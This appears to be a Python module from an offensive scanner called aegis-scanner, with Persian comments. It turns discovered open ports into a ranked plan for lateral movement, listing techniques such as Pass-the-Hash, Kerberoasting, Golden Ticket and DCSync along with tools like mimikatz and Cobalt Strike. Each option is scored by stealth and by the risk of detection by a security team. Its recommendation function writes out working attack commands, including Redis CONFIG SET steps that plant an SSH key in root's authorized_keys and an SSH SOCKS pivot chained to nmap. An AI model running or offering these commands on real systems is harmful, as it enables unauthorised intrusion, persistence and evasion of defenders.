# aegis-scanner/modules/lateral_movement.py
"""
آنالیز Lateral Movement و کشف Pivot Point‌ها.

این ماژول بر اساس سرویس‌های کشف‌شده، گراف شبکه را می‌سازد
و مسیرهای احتمالی حرکت جانبی از یک host به host دیگر را شناسایی می‌کند.

تکنیک‌های تحلیل:
  ├── Network topology inference از ARP/ICMP responses
  ├── Service reachability graph
  ├── Trust relationship mapping (Kerberos, SSH keys, SMB shares)
  ├── Credential reuse path analysis
  └── Pivot difficulty scoring
"""

import logging
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger(__name__)


# ─── Service lateral movement capability ─────────────────────────────────────
# هر سرویس چه قدرت lateral movement‌ای فراهم می‌کند
SERVICE_PIVOT_CAPABILITY = {
    "smb": {
        "pivot_score": 9,
        "techniques":  ["PsExec", "smbexec", "wmiexec", "Admin shares (C$, ADMIN$)"],
        "requires":    "Valid Windows credentials",
        "tools":       ["impacket", "CrackMapExec", "Metasploit"],
        "stealth":     "LOW",    # نویزی
    },
    "microsoft-ds": {
        "pivot_score": 9,
        "techniques":  ["EternalBlue propagation", "SMB relay", "Pass-the-Hash"],
        "requires":    "NTLM hash or plaintext credentials",
        "tools":       ["impacket", "Responder + NTLMrelayx"],
        "stealth":     "LOW",
    },
    "ssh": {
        "pivot_score": 8,
        "techniques":  ["SSH agent forwarding", "ProxyJump", "Dynamic port forwarding (SOCKS5)"],
        "requires":    "SSH private key or credentials",
        "tools":       ["ssh -J", "chisel", "proxychains + ssh -D"],
        "stealth":     "HIGH",   # SSH ترافیک رمزنگاری‌شده
    },
    "winrm": {
        "pivot_score": 8,
        "techniques":  ["PowerShell Remoting", "Invoke-Command", "Enter-PSSession"],
        "requires":    "Windows credentials",
        "tools":       ["evil-winrm", "PowerShell", "CrackMapExec"],
        "stealth":     "MEDIUM",
    },
    "rdp": {
        "pivot_score": 7,
        "techniques":  ["RDP session hijacking", "Pass-the-Hash via RDP", "Restricted Admin mode"],
        "requires":    "RDP credentials or NTLM hash",
        "tools":       ["xfreerdp", "mstsc", "Metasploit"],
        "stealth":     "LOW",    # GUI ترافیک زیاد
    },
    "http": {
        "pivot_score": 5,
        "techniques":  ["SSRF for internal pivot", "Web shell deployment", "Reverse proxy abuse"],
        "requires":    "Web app access or RCE",
        "tools":       ["curl", "web shell", "chisel over HTTP"],
        "stealth":     "HIGH",   # HTTP ترافیک blend می‌شود
    },
    "https": {
        "pivot_score": 6,
        "techniques":  ["SSRF", "Reverse HTTPS tunnel", "C2 over HTTPS"],
        "requires":    "Web app access",
        "tools":       ["chisel", "ngrok", "Cobalt Strike HTTPS beacon"],
        "stealth":     "HIGH",
    },
    "mysql": {
        "pivot_score": 6,
        "techniques":  ["UDF shell execution", "SELECT INTO OUTFILE for file write",
                        "MySQL linked servers"],
        "requires":    "MySQL root or FILE privilege",
        "tools":       ["mysql client", "raptor_udf"],
        "stealth":     "MEDIUM",
    },
    "redis": {
        "pivot_score": 9,
        "techniques":  ["SSH key injection", "Cron job RCE", "Config-based file write"],
        "requires":    "Unauthenticated or weak auth Redis",
        "tools":       ["redis-cli"],
        "stealth":     "HIGH",   # رفتار عادی Redis
    },
    "vnc": {
        "pivot_score": 7,
        "techniques":  ["Full GUI access", "Keylogger via VNC", "Screenshot capture"],
        "requires":    "VNC password (often blank)",
        "tools":       ["vncviewer", "Metasploit vnc_login"],
        "stealth":     "LOW",
    },
    "telnet": {
        "pivot_score": 8,
        "techniques":  ["Plaintext credential sniff + reuse", "Telnet relay"],
        "requires":    "Network position for sniffing",
        "tools":       ["Wireshark", "tcpdump", "telnet"],
        "stealth":     "HIGH",   # passive sniff
    },
    "ftp": {
        "pivot_score": 4,
        "techniques":  ["FTP bounce attack", "File drop for execution", "Passive credential sniff"],
        "requires":    "FTP write access",
        "tools":       ["ftp client", "Wireshark"],
        "stealth":     "MEDIUM",
    },
    "snmp": {
        "pivot_score": 5,
        "techniques":  ["Network topology enumeration via ARP table",
                        "SNMP SET for device config change"],
        "requires":    "SNMP community string",
        "tools":       ["snmpwalk", "snmpset"],
        "stealth":     "MEDIUM",
    },
    "ldap": {
        "pivot_score": 7,
        "techniques":  ["BloodHound AD path analysis", "ACL abuse", "DCSync"],
        "requires":    "Domain user credentials",
        "tools":       ["BloodHound", "SharpHound", "impacket secretsdump"],
        "stealth":     "MEDIUM",
    },
    "kerberos": {
        "pivot_score": 8,
        "techniques":  ["Kerberoasting", "AS-REP Roasting", "Golden Ticket", "Pass-the-Ticket"],
        "requires":    "Domain account (any)",
        "tools":       ["Rubeus", "impacket GetNPUsers", "mimikatz"],
        "stealth":     "HIGH",   # Kerberos ترافیک طبیعی
    },
}


@dataclass
class PivotPoint:
    """یک pivot point در شبکه"""
    host:            str
    port:            int
    service:         str
    pivot_score:     int              # 1-10
    techniques:      list
    tools:           list
    requires:        str
    stealth_level:   str              # LOW / MEDIUM / HIGH
    estimated_time:  str              # تخمین زمان pivot
    risk_to_operator: str             # ریسک شناسایی شدن برای red teamer


@dataclass
class LateralPath:
    """یک مسیر lateral movement"""
    from_host:  str
    to_service: str
    to_port:    int
    method:     str
    difficulty: str       # EASY / MEDIUM / HARD
    stealth:    str
    tools:      list
    steps:      list


@dataclass
class LateralMovementMap:
    """نقشه کامل lateral movement"""
    target:          str
    pivot_points:    list
    lateral_paths:   list
    highest_value:   Optional[PivotPoint]
    stealth_paths:   list           # مسیرهای با stealth بالا
    fastest_paths:   list           # سریع‌ترین مسیرها
    recommended_pivot: Optional[dict]
    network_summary: str


class LateralMovementAnalyzer:
    """
    آنالیز مسیرهای lateral movement بر اساس سرویس‌های شناسایی‌شده.

    بر اساس سرویس‌های موجود، بهترین استراتژی pivot را توصیه می‌کند
    با در نظر گرفتن stealth، سرعت، و پیچیدگی.
    """

    def analyze(
        self,
        primary_target: str,
        open_ports: list,
        network_range: Optional[str] = None,
        discovered_hosts: Optional[list] = None,
    ) -> LateralMovementMap:
        """
        آنالیز کامل lateral movement از primary target.
        """
        pivot_points = []
        lateral_paths = []

        # شناسایی pivot points از سرویس‌های باز
        for port_data in open_ports:
            service = port_data.get("service", "").lower()
            port    = port_data.get("port", 0)
            host    = port_data.get("host", primary_target)

            capability = SERVICE_PIVOT_CAPABILITY.get(service)
            if not capability:
                continue

            pivot = PivotPoint(
                host=host,
                port=port,
                service=service,
                pivot_score=capability["pivot_score"],
                techniques=capability["techniques"],
                tools=capability["tools"],
                requires=capability["requires"],
                stealth_level=capability["stealth"],
                estimated_time=self._estimate_time(capability["pivot_score"]),
                risk_to_operator=self._operator_risk(capability["stealth"]),
            )
            pivot_points.append(pivot)

            # ساخت lateral paths
            paths = self._build_lateral_paths(host, port, service, capability)
            lateral_paths.extend(paths)

        # مرتب‌سازی pivot points بر اساس score
        pivot_points.sort(key=lambda p: -p.pivot_score)

        # پیدا کردن بهترین pivot
        highest_value = pivot_points[0] if pivot_points else None

        # مسیرهای stealth بالا
        stealth_paths = [p for p in lateral_paths if p.stealth == "HIGH"]
        # سریع‌ترین مسیرها
        fastest_paths = [p for p in lateral_paths if p.difficulty == "EASY"]

        # توصیه نهایی
        recommendation = self._build_recommendation(pivot_points, lateral_paths)

        summary = self._build_summary(
            primary_target, pivot_points, lateral_paths, highest_value
        )

        return LateralMovementMap(
            target=primary_target,
            pivot_points=pivot_points,
            lateral_paths=lateral_paths,
            highest_value=highest_value,
            stealth_paths=stealth_paths,
            fastest_paths=fastest_paths,
            recommended_pivot=recommendation,
            network_summary=summary,
        )

    # ─── Helpers ──────────────────────────────────────────────────────────
    @staticmethod
    def _build_lateral_paths(
        host: str, port: int, service: str, capability: dict
    ) -> list:
        """ساخت lateral paths برای یک سرویس"""
        paths = []
        stealth = capability["stealth"]
        score   = capability["pivot_score"]

        difficulty = (
            "EASY"   if score >= 8 else
            "MEDIUM" if score >= 5 else
            "HARD"
        )

        for i, technique in enumerate(capability["techniques"][:3]):
            steps = [
                f"Gain initial access via {service}:{port}",
                f"Execute: {technique}",
                "Establish persistence on pivot host",
                "Tunnel traffic through compromised host",
            ]
            paths.append(LateralPath(
                from_host=host,
                to_service=service,
                to_port=port,
                method=technique,
                difficulty=difficulty,
                stealth=stealth,
                tools=capability["tools"],
                steps=steps,
            ))

        return paths

    @staticmethod
    def _estimate_time(score: int) -> str:
        """تخمین زمان pivot بر اساس score"""
        if score >= 8:   return "5-15 minutes"
        if score >= 6:   return "15-60 minutes"
        return "1-4 hours"

    @staticmethod
    def _operator_risk(stealth: str) -> str:
        """ریسک شناسایی شدن red teamer"""
        return {
            "HIGH":   "LOW (blend with normal traffic)",
            "MEDIUM": "MEDIUM (some log entries expected)",
            "LOW":    "HIGH (noisy — expect SOC response)",
        }.get(stealth, "MEDIUM")

    @staticmethod
    def _build_recommendation(
        pivots: list, paths: list
    ) -> Optional[dict]:
        """توصیه بهترین استراتژی pivot"""
        if not pivots:
            return None

        # اگر SSH موجود است → بهترین گزینه برای stealth
        ssh_pivots = [p for p in pivots if p.service == "ssh"]
        if ssh_pivots:
            best = ssh_pivots[0]
            return {
                "priority":    1,
                "service":     "SSH",
                "reason":      (
                    "SSH provides encrypted tunnel — "
                    "lowest detection probability. "
                    "Use dynamic port forwarding (-D) for SOCKS5 proxy."
                ),
                "command":     (
                    f"ssh -D 1080 -N -q user@{best.host} "
                    f"&& proxychains nmap [next-target]"
                ),
                "host":        best.host,
                "port":        best.port,
                "stealth":     best.stealth_level,
                "time_est":    best.estimated_time,
            }

        # Redis → خیلی قدرتمند اما پر سر و صدا
        redis_pivots = [p for p in pivots if p.service == "redis"]
        if redis_pivots:
            best = redis_pivots[0]
            return {
                "priority":    1,
                "service":     "Redis",
                "reason":      (
                    "Redis (no-auth) allows SSH key injection or cron RCE — "
                    "high impact pivot with minimal prerequisites."
                ),
                "command":     (
                    f'redis-cli -h {best.host} CONFIG SET dir /root/.ssh && '
                    f'redis-cli -h {best.host} CONFIG SET dbfilename authorized_keys && '
                    f'redis-cli -h {best.host} SET pwn "ssh-rsa AAAA..."'
                ),
                "host":        best.host,
                "port":        best.port,
                "stealth":     best.stealth_level,
                "time_est":    best.estimated_time,
            }

        # fallback → highest score pivot
        best = pivots[0]
        return {
            "priority":    1,
            "service":     best.service,
            "reason":      f"Highest pivot score ({best.pivot_score}/10)",
            "host":        best.host,
            "port":        best.port,
            "techniques":  best.techniques[:2],
            "stealth":     best.stealth_level,
            "time_est":    best.estimated_time,
        }

    @staticmethod
    def _build_summary(
        target: str, pivots: list, paths: list, best: Optional[PivotPoint]
    ) -> str:
        if not pivots:
            return f"No lateral movement vectors identified on {target}."

        stealth_count = sum(1 for p in pivots if p.stealth_level == "HIGH")
        return (
            f"Identified {len(pivots)} lateral movement vector(s) on {target} "
            f"across {len(set(p.service for p in pivots))} service type(s). "
            f"{stealth_count} high-stealth pivot(s) available. "
            f"Best pivot: {best.service}:{best.port} "
            f"(score={best.pivot_score}/10, stealth={best.stealth_level})."
        )

    def to_dict(self, m: LateralMovementMap) -> dict:
        def pivot_dict(p: PivotPoint) -> dict:
            return {
                "host":             p.host,
                "port":             p.port,
                "service":          p.service,
                "pivot_score":      p.pivot_score,
                "techniques":       p.techniques,
                "tools":            p.tools,
                "requires":         p.requires,
                "stealth_level":    p.stealth_level,
                "estimated_time":   p.estimated_time,
                "risk_to_operator": p.risk_to_operator,
            }

        def path_dict(p: LateralPath) -> dict:
            return {
                "from_host":  p.from_host,
                "to_service": p.to_service,
                "to_port":    p.to_port,
                "method":     p.method,
                "difficulty": p.difficulty,
                "stealth":    p.stealth,
                "tools":      p.tools,
                "steps":      p.steps,
            }

        return {
            "target":             m.target,
            "pivot_count":        len(m.pivot_points),
            "pivot_points":       [pivot_dict(p) for p in m.pivot_points],
            "lateral_paths":      [path_dict(p) for p in m.lateral_paths[:10]],
            "stealth_path_count": len(m.stealth_paths),
            "easy_path_count":    len(m.fastest_paths),
            "recommended_pivot":  m.recommended_pivot,
            "network_summary":    m.network_summary,
        }
